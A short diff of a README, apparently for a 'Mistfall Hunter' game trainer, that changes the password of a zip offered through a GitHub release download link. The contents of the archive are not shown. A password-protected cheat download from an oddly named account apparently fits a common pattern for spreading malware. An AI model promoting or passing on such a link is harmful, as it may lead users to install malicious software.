@@ -138,7 +138,7 @@ upvote configs |
 
 ## ⚡[DOWNLOAD](https://github.com/nick-code-ops1904y5/Mistfall-Hunter-Trainer/releases/download/download/mh-trainer.zip)
 
-**pass: 2026**
+**pass: mh-trainer-v3**
 
 --- 
 
